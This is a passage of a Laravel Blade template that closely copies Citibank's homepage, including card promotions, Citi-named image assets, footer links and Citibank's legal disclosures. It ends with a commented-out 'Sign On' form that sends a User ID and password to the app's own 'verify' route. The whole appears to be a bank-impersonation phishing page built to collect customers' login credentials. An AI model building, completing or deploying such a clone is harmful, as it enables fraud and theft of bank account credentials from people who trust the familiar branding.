QuMjM5M0MxNy4zNjQ0IDI0LjA4ODkgMTcuMzM1MiAyMy44MTU4IDE3LjQ3ODUgMjMuNjI4OUMxNy42MjE5IDIzLjQ0MDIgMTcuODg0NCAyMy40MTA2IDE4LjA2NDQgMjMuNTU5M1oiIGZpbGw9IiMwNTZEQUUiLz4KPC9zdmc+Cg==&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Investing Options</span>
            </div>

            <div class="text-sm text-center my-1.75 flex flex-col items-center text-input font-bold leading-5.25">
                <div style="background: url(&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iMjAiIGZpbGw9IiNFRkYzRjgiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yNy44MzA4IDEwTDIwLjQ2ODQgMTAuNjg4OUMxOS45OCAxMC43MzQ0IDE5LjUyMzUgMTAuOTQ4MyAxOS4xNzY1IDExLjI5NjFMMTEuMTk4NSAxOS4yNzMxQzEwLjAzMDQgMjAuNDQyIDkuNjExODIgMjEuMjU4OSAxMC40MTM2IDIyLjA2MDZMMTcuOTM5NCAyOS41ODYyQzE4Ljc0MTEgMzAuMzg4IDE5LjU1OCAyOS45NzAzIDIwLjcyNyAyOC44MDEzTDI4LjcwNDIgMjAuODIzNUMyOS4wNTIgMjAuNDc2NSAyOS4yNjU5IDIwLjAyMDEgMjkuMzExNCAxOS41MzA4TDI5Ljk5ODYgMTIuMTk1NUMzMC4wMDAzIDEyLjEyNjUgMzAuMDAwMyAxMi4wODQ0IDI5Ljk5OTQgMTIuMDQxNEMyOS45NjQ5IDEwLjkwMDMgMjkuMDMwMSAxMCAyNy44OTQ4IDEwQzI3Ljg3MzggMTAgMjcuODUxOSAxMCAyNy44MzA4IDEwWk0xOC41MzM5IDI4Ljk5TDExLjAwOTggMjEuNDY1MkMxMC43MTc2IDIxLjE3MzggMTAuOTU4NSAyMC43MDM5IDExLjc5MzkgMTkuODY4NUwxOS43NzExIDExLjg5MTVDMTkuOTggMTEuNjgyNiAyMC4yNTM3IDExLjU1MzggMjAuNTQ3NiAxMS41MjY4TDI3Ljg4MyAxMC44NDA1QzI4LjU1MzQgMTAuODIxMSAyOS4xMzU0IDExLjM2OTQgMjkuMTU4MSAxMi4wNjY3QzI5LjE1ODkgMTIuMDkyOCAyOS4xNTg5IDEyLjExOCAyOS4xNTgxIDEyLjE0MzNMMjguNDczNCAxOS40NTI1QzI4LjQ0NTYgMTkuNzQ2NCAyOC4zMTY4IDIwLjAyMDEgMjguMTA4NyAyMC4yMjgxTDIwLjEzMTYgMjguMjA1OUMxOS41MjEgMjguODE2NSAxOS4xMDU4IDI5LjEwODcgMTguODExOSAyOS4xMDg3QzE4LjcwNDEgMjkuMTA4NyAxOC42MTMxIDI5LjA2OTEgMTguNTMzOSAyOC45OVpNMjMuMTA5NSAxMy4zMTgxQzIyLjEyMjUgMTQuMzA1MSAyMi4xMjI1IDE1LjkwNDQgMjMuMTA5NSAxNi44OTA2QzI0LjA5NDkgMTcuODc3NiAyNS42OTU5IDE3Ljg3NzYgMjYuNjgyMSAxNi44OTA2QzI3LjY2OTEgMTUuOTA0NCAyNy42NjkxIDE0LjMwNTEgMjYuNjgyMSAxMy4zMTgxQzI2LjE4ODYgMTIuODI0NiAyNS41NDI2IDEyLjU3NzkgMjQuODk1OCAxMi41Nzc5QzI0LjI0OSAxMi41Nzc5IDIzLjYwMjIgMTIuODI0NiAyMy4xMDk1IDEzLjMxODFaTTIzLjcwNSAxNi4yOTUyQzIzLjA0NzIgMTUuNjM3NSAyMy4wNDcyIDE0LjU3MDQgMjMuNzA1IDEzLjkxMjdDMjQuMzYyNyAxMy4yNTU4IDI1LjQyODkgMTMuMjU1OCAyNi4wODY3IDEzLjkxMjdDMjYuNzQ0NCAxNC41NzA0IDI2Ljc0NDQgMTUuNjM3NSAyNi4wODY3IDE2LjI5NTJDMjUuNzU3NCAxNi42MjQ1IDI1LjMyNjIgMTYuNzg4NyAyNC44OTU4IDE2Ljc4ODdDMjQuNDY0NiAxNi43ODg3IDI0LjAzNDIgMTYuNjI0NSAyMy43MDUgMTYuMjk1MloiIGZpbGw9IiMwNTZEQUUiLz4KPC9zdmc+Cg==&quot;); height: 40px; margin-bottom: 10px; width: 40px;"></div>
                <span>Small Business</span>
            </div>
        </div>
    </div>

    <div class="bg-[#C5E4F3] text-[#333333]">
        <div class="w-290 mx-43">
            <div class="grid grid-cols-2 p-12">
                <div class="px-2.5 mb-4">
                    <img
                        src="{{ Vite::asset('resources/images/HP25_STRATA_FAM_July_LRN_3UP_Module.jpg') }}"
                        class="max-h-82 max-w-145 object-cover object-center align-middle rounded-2xl"
                        alt="Introducing the Citi Strata<sup>℠</sup>&nbsp;credit cards"
                    />
                </div>
                <div class="flex items-center pl-12">
                    <div class="pl-12 flex flex-col">
                        <p class="font-light tracking-wider">
                            NOW AVAILABLE
                        </p>
                        <h1 class="font-bold text-[#424242] text-[42px] leading-[50px] mb-3">
                            Introducing the Citi
                            Strata<sup class="text-[.6em] font-light font-sans">℠</sup>&nbsp;credit cards
                        </h1>
                        <p class="font-light leading-6 mb-2.5">
                            Get rewarded for everyday essentials, extraordinary travel experiences and more.
                        </p>

                        <a
                            role="button"
                            href="#"
                            class="text-white bg-input cursor-pointer font-bold text-center max-w-max my-5 mr-2.5 py-3.25 px-15 rounded-lg hover:bg-button-focus focus:bg-button-focus"
                        >
                            Learn More
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="bg-[#F0F5F7] text-[#333333]">
        <div class="w-290 mx-43">
            <div class="grid grid-cols-2 p-12">
                <div class="flex items-center pr-12">
                    <div class="pl-12 flex flex-col">
                        <p class="font-light tracking-wider">
                            CITI<sup>&reg;</sup> CREDIT CARDS
                        </p>
                        <h1 class="font-bold text-[#424242] text-[42px] leading-[50px] mb-3">
                            Choose the right Citi<sup>&reg;</sup> credit card for you
                        </h1>
                        <p class="font-light leading-6 mb-2.5">
                            Whether you want Cash Back, a Low Intro Rate, Rewards for Costco Members, or Great Airline Miles, the choice is all yours.
                        </p>

                        <a
                            role="button"
                            href="#"
                            class="text-white bg-input cursor-pointer font-bold text-center max-w-max my-5 mr-2.5 py-3.25 px-15 rounded-lg hover:bg-button-focus focus:bg-button-focus"
                        >
                            Learn More
                        </a>
                    </div>
                </div>

                <div class="px-2.5 mb-4">
                    <img
                        src="{{ Vite::asset('resources/images/HP_12909_MPC_3UP_M7.jpg') }}"
                        class="max-h-82 max-w-145 object-cover object-center align-middle rounded-2xl"
                        alt="Introducing the Citi Strata<sup>℠</sup>&nbsp;credit cards"
                    />
                </div>
            </div>
        </div>
    </div>

    <div class="mx-auto lg:w-240 xl:w-290">
        <div class="grid grid-cols-2 px-13">
            <div class="px-10 relative mb-4">
                <img
                    src="{{ Vite::asset('resources/images/Hero_HP25_CFP_0625_YF_YW.png') }}"
                    class="max-h-[90%] w-full object-contain absolute bottom-0 left-1/2 transform -translate-x-1/2"
                    alt="You future, your way"
                >
            </div>
            <div class="p-10 pr-0 flex flex-col">
                <div class="h-35"></div>
                <p class="text-[#333333] font-light tracking-wider">
                    CITI FINANCIAL PATHWAYS
                </p>
                <h1 class="text-[#333333] font-bold text-[42px] leading-[50px] mb-3">
                    Your future, your way
                </h1>
                <p class="font-light text-[#333333] leading-6 mb-2.5">
                    Wherever you are on your financial journey, we’re here to help with resources to support your goals.
                </p>

                <a
                    role="button"
                    href="#"
                    class="text-white bg-input cursor-pointer font-bold text-center max-w-max my-5 mr-2.5 py-3.25 px-15 rounded-lg hover:bg-button-focus focus:bg-button-focus"
                >
                    Explore Now
                </a>
            </div>
        </div>
    </div>


    <footer class="bg-[#333333] text-white">
        <div class="pt-10 px-35 flex flex-col">
            <div class="flex pb-5">
                <div class="grid grid-cols-5 gap-x-5 grow">
                    <div class="flex flex-col gap-y-4 items-stretch">
                        <h4 class="text-white text-sm font-bold leading-5">Why Citi</h4>
                        <div class="flex flex-col text-white text-xs font-light leading-4.5 gap-y-2.5">
                            <a href="#" class="hover:underline">Our Story</a>
                            <a href="#" class="hover:underline">Careers</a>
                            <a href="#" class="hover:underline">Benefits and Services</a>
                            <a href="#" class="hover:underline">Rewards</a>
                            <a href="#" class="hover:underline">
                                Citi Entertainment<span class="text-[9px] pb-1.5">&reg;</span>
                            </a>
                            <a href="#" class="hover:underline">Special Offers</a>
                        </div>
                    </div>

                    <div class="flex flex-col gap-y-4 items-stretch">
                        <h4 class="text-white text-sm font-bold leading-5">Wealth Management</h4>
                        <div class="flex flex-col text-white text-xs font-light leading-4.5 gap-y-2.5">
                            <a href="#" class="hover:underline"></a>
                            <a href="#" class="hover:underline">Careers</a>
                            <a href="#" class="hover:underline">Benefits and Services</a>
                            <a href="#" class="hover:underline">Rewards</a>
                            <a href="#" class="hover:underline">
                                Citi Entertainment<span class="text-[9px] pb-1.5">&reg;</span>
                            </a>
                            <a href="#" class="hover:underline">Special Offers</a>
                        </div>
                    </div>

                    <div class="flex flex-col gap-y-4 items-stretch">
                        <h4 class="text-white text-sm font-bold leading-5">Business Baking</h4>
                        <div class="flex flex-col text-white text-xs font-light leading-4.5 gap-y-2.5">
                            <a href="#" class="hover:underline">Small Business Accounts</a>
                            <a href="#" class="hover:underline">Commercial Accounts</a>
                        </div>
                    </div>

                    <div class="flex flex-col gap-y-4 items-stretch">
                        <h4 class="text-white text-sm font-bold leading-5">Rates</h4>
                        <div class="flex flex-col text-white text-xs font-light leading-4.5 gap-y-2.5">
                            <a href="#" class="hover:underline">Personal Banking</a>
                            <a href="#" class="hover:underline">Credit Cards</a>
                            <a href="#" class="hover:underline">Mortgage</a>
                            <a href="#" class="hover:underline">Home Equity</a>
                            <a href="#" class="hover:underline">Personal Loans</a>
                        </div>
                    </div>

                    <div class="flex flex-col gap-y-4 items-stretch">
                        <h4 class="text-white text-sm font-bold leading-5">Help & Support</h4>
                        <div class="flex flex-col text-white text-xs font-light leading-4.5 gap-y-2.5">
                            <a href="#" class="hover:underline">Contact Us</a>
                            <a href="#" class="hover:underline">Help & FAQs</a>
                            <a href="#" class="hover:underline">Security Center</a>
                        </div>
                    </div>
                </div>

                <div class="shrink-0">
                    <img
                        src="{{ Vite::asset('resources/images/Citi_Icon_Sprite_Nav_v2.svg') }}"
                        style="object-fit: none; object-position: -221px -25px; width: 29px; height: 30px;"
                        alt="Equal Housing Lender"
                    />
                </div>
            </div>

            <div class="py-5 flex items-center justify-between">
                {{-- <div class="flex items-center gap-x-6">
                    <img
                        src="{{ Vite::asset('resources/images/Citi_Icon_Sprite_v2.svg') }}"
                        class="object-cover"
                        style="object-position: -100px -20px; height: 40px; width: 137px;"
                        alt="Googleplay"
                    />
                </div> --}}
            </div>

            <div class="border-y border-[#666666] py-5 text-white text-xs flex items-center mb-6">
                <p class="font-bold">&copy; {{ date('Y') }} Citigroup Inc</p>
                <div class="flex items-center">
                    <a href="#" class="hover:underline py-1.5 px-5">Terms & Conditions</a>
                    <a href="#" class="hover:underline py-1.5 px-5">Privacy</a>
                    <a href="#" class="hover:underline py-1.5 px-5">Notice at Collection</a>
                    <a href="#" class="hover:underline py-1.5 px-5">Do Not Sell or Share My Personal Information</a>
                    <a href="#" class="hover:underline py-1.5 px-5">Accessibility</a>
                </div>
            </div>

            <div class="flex flex-col text-xs">
                <h4 class="text-white font-bold mb-2">Important Legal Disclosures & Information</h4>
                <p class="text-[#F4F4F4] mb-4 font-light">
                    Citibank.com provides information about and access to accounts and financial services provided by Citibank,
                    N.A. and its affiliates in the United States and its territories. This is not, and should not be construed as,
                    an offer, invitation, or solicitation to buy or sell any of the banking or financial products mentioned herein
                    to individuals outside of the United States. The products and services mentioned herein are not offered to
                    individual residents in Europe, including the European Union, European Economic Area, Switzerland, the
                    United Kingdom, and similar countries.
                </p>
                <p class="text-[#F4F4F4] mb-4 font-light">
                    Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all
                    accounts, products, and services as well as pricing described here are available in all jurisdictions or to
                    all customers. Your eligibility for a particular product and service is subject to a final determination by
                    Citibank and its affiliates. Your country of citizenship, domicile, or residence if other than the
                    United States, may have laws rules, and regulations that govern or affect your application for and use of our
                    accounts, products and services, including laws regarding taxes, exchange and/or capital controls that you are
                    responsible for following.
                </p>
            </div>
        </div>

        <div class="pt-10 px-10">
            <img
                src="{{ Vite::asset('resources/images/citiredesign-footer.svg') }}"
                class="w-22"
                alt="Citi Banner"
            />
        </div>
    </footer>

    {{-- <div
        class="bg-white w-sm p-4 rounded-2xl"
        style="box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 10px 0px;"
    >
        <form action="{{ route('verify') }}" method="POST">
            @csrf

            <div class="flex flex-col gap-y-4">
                <div class="flex flex-col gap-y-1.5">
                    <label for="email" class="text-sm text-neutral-700">User ID</label>
                    <input
                        type="text"
                        name="email"
                        id="email"
                        class="{{
                            cn([
                                'text-input font-bold outline-none w-full h-13 py-3.25 px-4 rounded-lg border border-neutral-400',
                                'placeholder:text-neutral-500 placeholder:italic placeholder:font-normal',
                                'focus:border-input ring-offset-2 ring-offset-white focus:ring-2 focus:ring-ring',
                            ])
                        }}"
                        placeholder="User ID"
                    />
                </div>

                <div class="flex flex-col gap-y-1.5">
                    <label for="password" class="text-sm text-neutral-700">Password</label>
                    <input
                        type="password"
                        name="password"
                        id="password"
                        class="{{
                            cn([
                                'text-input font-bold outline-none w-full h-13 py-3.25 px-4 rounded-lg border border-neutral-400',
                                'placeholder:text-neutral-500 placeholder:italic placeholder:font-normal',
                                'focus:border-input ring-offset-2 ring-offset-white focus:ring-2 focus:ring-ring',
                            ])
                        }}"
                        placeholder="Password"
                    />
                </div>

                <button
                    type="submit"
                    class="{{
                        cn([
                            'bg-input text-white font-bold rounded-lg h-10 leading-6 outline-none text-center w-full border border-input',
                            'hover:bg-button-focus focus:bg-button-focus hover:border-button-focus focus:border-button-focus',
                        ])
                    }}"
                >
                    Sign On
                </button>
            </div>
        </form>
    </div> --}}
</x-layouts.app>
